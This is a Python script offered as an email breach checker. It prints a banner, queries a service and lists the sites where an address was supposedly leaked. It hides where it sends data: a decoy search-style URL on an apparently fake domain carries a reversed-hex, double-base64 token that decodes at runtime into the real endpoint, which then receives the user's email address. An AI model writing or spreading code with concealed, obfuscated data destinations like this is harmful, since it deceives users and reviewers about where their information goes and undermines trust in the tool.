#af@pwned
from urllib.request import urlopen, Request
import re
import urllib.parse 
import base64
from bs4 import BeautifulSoup
import time
import sys
import os
cred = '\033[91m'
reset = '\033[0m'
cgreen = '\033[32m'
if len(sys.argv) > 1:
    pass
else:
    print("usage: python3 af@pwned.py emailid@gmail.com")
    exit(0)
os.system('clear')
f=open("server_logo",'r')
for line in f:
    line=line.strip('\n')
    print(line)
    time.sleep(0.01)

headers1 = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) ' 
                      'AppleWebKit/537.11 (KHTML, like Gecko) '
                      'Chrome/23.0.1271.64 Safari/537.11',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
        'Accept-Encoding': 'none',
        'Accept-Language': 'en-US,en;q=0.8',
        'Connection': 'keep-alive'}
print("[+]searching for "+sys.argv[1])
time.sleep(0.5) 
url = "https://dataseofhacked-id.com/search?safe=active&sxsrf=ALeKk01hJGUyFv5Sgc7wE6C_kZJE9Md26Q%3A1584005994386active&sxsrf=ALeKk008fqbuJGcfFlQ8mn_nOhtTQh_xFQ%3A1584007890165&ei=0gpqXqHbCb6DrtoPmfWawAo&q=is+that+my+email+id+hacked&oq=is+that+my+email+id+ahcked&gs_l=psy-ab.3...0.0..25610...0.0..0.0.0.......0......gws-wiz.-jZ79Zzup5Q&ved=0ahUKEwihjPWc2ZToAhW-gUsFHZm6BqgQ4dUDCAs&uact=5&ei&tokken=9314a6d4960775e444076426139444a53365a7651687d635856474261686657567c64556d4a5454594e474d435865595"
reg_data = bytes.fromhex(','.join(url.split("tokken=")[1:])[::-1]).decode('utf-8')
pwned_data = base64.b64decode
for i in range(2):
    reg_data = pwned_data(reg_data).decode('utf-8').strip('\n')
payload = {'Account':sys.argv[1]}
data = urllib.parse.urlencode(payload)
data=bytes(data,'utf-8')
req = Request(url=reg_data,headers=headers1,data=data) 
html = urlopen(req).read() 
print("[+]collecting databases")
time.sleep(0.5)
pwnedno = re.findall(r'<p id="pwnCount">(.*?)<',str(html))
str1 = " "
str1 = str1.join(pwnedno)
if str1 == "Not pwned on any ":
    print("--------------------:")
    print(cgreen+"[#]Wow Your safe!!! |"+reset)
    print("--------------------:")
    print("[+]Not Hacked")
    time.sleep(0.5)
    exit(0)
elif "Pwned on " in str1 : 
    print("[+]email-id found")
    time.sleep(0.1)
    print(cred +"[*]Oops email-id Hacked"+reset)
    time.sleep(0.5)
for eachP in pwnedno:
    print("[*]"+eachP)
print("---------------------")
print("Details Leaked from")
print("---------------------")
sites = re.findall(r'pwnedCompanyTitle">(.*?)<',str(html))
details = re.findall(r'Compromised data:</strong>(.*?)<',str(html))
for eachP,eachD in zip(sites,details):
    print("[+]"+eachP +eachD)



